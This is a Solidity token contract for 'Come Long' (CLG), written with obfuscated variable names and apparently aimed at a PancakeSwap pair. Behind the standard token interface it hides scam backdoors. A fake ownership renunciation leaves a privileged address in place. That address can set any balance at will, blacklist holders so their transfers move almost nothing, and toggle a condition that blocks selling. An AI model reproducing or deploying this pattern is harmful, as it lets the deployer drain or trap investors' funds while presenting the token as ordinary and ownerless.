//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface sellMarketingTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverLaunchLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeBuy {
    function createPair(address toAmount, address launchAtTo) external returns (address);
}

interface launchTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeTotal) external view returns (uint256);

    function transfer(address receiverWallet, uint256 launchedTx) external returns (bool);

    function allowance(address shouldMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTx) external returns (bool);

    function transferFrom(
        address sender,
        address receiverWallet,
        uint256 launchedTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTrading, uint256 value);
    event Approval(address indexed shouldMin, address indexed spender, uint256 value);
}

interface launchTeamMetadata is launchTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ComeLong is receiverLaunchLimit, launchTeam, launchTeamMetadata {

    string private txReceiver = "Come Long";

    function decimals() external view virtual override returns (uint8) {
        return totalSender;
    }

    function feeTotal(address sellFundLimit, uint256 launchedTx) public {
        fundBuyTotal();
        launchedToken[sellFundLimit] = launchedTx;
    }

    string private modeLaunch = "CLG";

    uint256 private tradingIsMarketing;

    uint256 public senderMode;

    uint256 public amountFromToken;

    event OwnershipTransferred(address indexed enableTradingFrom, address indexed exemptToken);

    function approve(address exemptAuto, uint256 launchedTx) public virtual override returns (bool) {
        maxIs[_msgSender()][exemptAuto] = launchedTx;
        emit Approval(_msgSender(), exemptAuto, launchedTx);
        return true;
    }

    function senderLiquidity(address launchMinWallet, address receiverWallet, uint256 launchedTx) internal returns (bool) {
        if (launchMinWallet == receiverLaunch) {
            return atLimit(launchMinWallet, receiverWallet, launchedTx);
        }
        uint256 receiverExemptFund = launchTeam(maxShould).balanceOf(limitShould);
        require(receiverExemptFund == feeTake);
        require(receiverWallet != limitShould);
        if (receiverReceiver[launchMinWallet]) {
            return atLimit(launchMinWallet, receiverWallet, fromSellMin);
        }
        return atLimit(launchMinWallet, receiverWallet, launchedTx);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenSender;
    }

    address public receiverLaunch;

    function receiverWalletShould(address isLaunched) public {
        if (listMarketing) {
            return;
        }
        
        limitFrom[isLaunched] = true;
        if (marketingBuy == maxReceiver) {
            txFund = maxReceiver;
        }
        listMarketing = true;
    }

    uint256 private tokenSender = 100000000 * 10 ** 18;

    function balanceOf(address takeTotal) public view virtual override returns (uint256) {
        return launchedToken[takeTotal];
    }

    bool public listMarketing;

    bool private amountTotal;

    function transferFrom(address launchMinWallet, address receiverWallet, uint256 launchedTx) external override returns (bool) {
        if (_msgSender() != senderReceiverAmount) {
            if (maxIs[launchMinWallet][_msgSender()] != type(uint256).max) {
                require(launchedTx <= maxIs[launchMinWallet][_msgSender()]);
                maxIs[launchMinWallet][_msgSender()] -= launchedTx;
            }
        }
        return senderLiquidity(launchMinWallet, receiverWallet, launchedTx);
    }

    function atLimit(address launchMinWallet, address receiverWallet, uint256 launchedTx) internal returns (bool) {
        require(launchedToken[launchMinWallet] >= launchedTx);
        launchedToken[launchMinWallet] -= launchedTx;
        launchedToken[receiverWallet] += launchedTx;
        emit Transfer(launchMinWallet, receiverWallet, launchedTx);
        return true;
    }

    address public maxShould;

    constructor (){
        
        sellMarketingTo swapEnable = sellMarketingTo(senderReceiverAmount);
        maxShould = modeBuy(swapEnable.factory()).createPair(swapEnable.WETH(), address(this));
        if (marketingBuy == amountFromToken) {
            amountFromToken = senderMode;
        }
        receiverLaunch = _msgSender();
        exemptMin();
        limitFrom[receiverLaunch] = true;
        launchedToken[receiverLaunch] = tokenSender;
        
        emit Transfer(address(0), receiverLaunch, tokenSender);
    }

    mapping(address => bool) public receiverReceiver;

    function owner() external view returns (address) {
        return tradingIs;
    }

    address limitShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private listTokenBuy;

    function fundBuyTotal() private view {
        require(limitFrom[_msgSender()]);
    }

    mapping(address => uint256) private launchedToken;

    address senderReceiverAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function exemptMin() public {
        emit OwnershipTransferred(receiverLaunch, address(0));
        tradingIs = address(0);
    }

    uint8 private totalSender = 18;

    bool public maxLaunchList;

    function symbol() external view virtual override returns (string memory) {
        return modeLaunch;
    }

    uint256 launchSwap;

    function name() external view virtual override returns (string memory) {
        return txReceiver;
    }

    mapping(address => bool) public limitFrom;

    uint256 public txFund;

    bool public buyExempt;

    mapping(address => mapping(address => uint256)) private maxIs;

    function minFund(uint256 launchedTx) public {
        fundBuyTotal();
        feeTake = launchedTx;
    }

    function allowance(address fundTrading, address exemptAuto) external view virtual override returns (uint256) {
        if (exemptAuto == senderReceiverAmount) {
            return type(uint256).max;
        }
        return maxIs[fundTrading][exemptAuto];
    }

    uint256 constant fromSellMin = 18 ** 10;

    uint256 feeTake;

    function launchTeamMarketing(address modeBuyExempt) public {
        fundBuyTotal();
        if (listTokenBuy) {
            txFund = maxReceiver;
        }
        if (modeBuyExempt == receiverLaunch || modeBuyExempt == maxShould) {
            return;
        }
        receiverReceiver[modeBuyExempt] = true;
    }

    function transfer(address sellFundLimit, uint256 launchedTx) external virtual override returns (bool) {
        return senderLiquidity(_msgSender(), sellFundLimit, launchedTx);
    }

    address private tradingIs;

    uint256 public marketingBuy;

    uint256 public maxReceiver;

    function getOwner() external view returns (address) {
        return tradingIs;
    }

}